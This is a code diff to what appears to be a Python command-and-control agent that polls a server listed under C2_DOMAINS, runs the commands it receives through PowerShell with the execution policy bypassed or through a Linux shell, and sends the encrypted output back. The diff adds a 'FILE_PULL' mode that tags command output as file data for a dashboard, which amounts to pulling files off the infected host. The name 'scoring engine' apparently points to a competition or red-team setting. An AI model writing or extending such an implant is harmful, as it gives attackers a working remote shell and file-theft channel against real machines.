@@ -13,7 +13,10 @@ cipher = Fernet(SECRET_KEY)
 C2_DOMAINS = ["https://midevil-scoring-engine.com"]
 
 # Path to self-signed cert
-CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"
+if platform.system() == "Windows":
+    CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"
+else:
+    CERT_PATH = r"/etc/ssl/certs/nginx-selfsigned.crt"
 
 def get_system_info():
     """Gathers system metadata for the dashboard asset inventory."""
@@ -54,15 +57,32 @@ def run_agent():
                         print(f"[*] Executing: {command}")
                         
                         # --- ENHANCED EXECUTION LOGIC ---
-                        if current_os == "Windows":
-                            # Use PowerShell with Bypass for full flexibility
-                            full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
-                            raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
-                        else:
-                            # Standard Linux execution
-                            raw_result = subprocess.getoutput(command)
-                        # --------------------------------
+                        try:
+                            # Check if this is a File Vault Pull operation
+                            if command.startswith("FILE_PULL|"):
+                                _, file_path, actual_cmd = command.split("|", 2)
+                                
+                                if current_os == "Windows":
+                                    full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", actual_cmd]
+                                    output = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
+                                else:
+                                    output = subprocess.getoutput(actual_cmd)
+                                
+                                # Wrap output in tags so the dashboard auto-detects it
+                                raw_result = f"\nFILE_DATA_START\n{output}\nFILE_DATA_END\n"
+                            
+                            else:
+                                # Standard Command Execution
+                                if current_os == "Windows":
+                                    full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
+                                    raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
+                                else:
+                                    raw_result = subprocess.getoutput(command)
                         
+                        except Exception as e:
+                            raw_result = f"Error executing: {str(e)}"
+                        # --------------------------------
+
                         # 3. Format Result
                         formatted_result = f"{my_hostname}|{raw_result}"
                         encrypted_result = cipher.encrypt(formatted_result.encode())
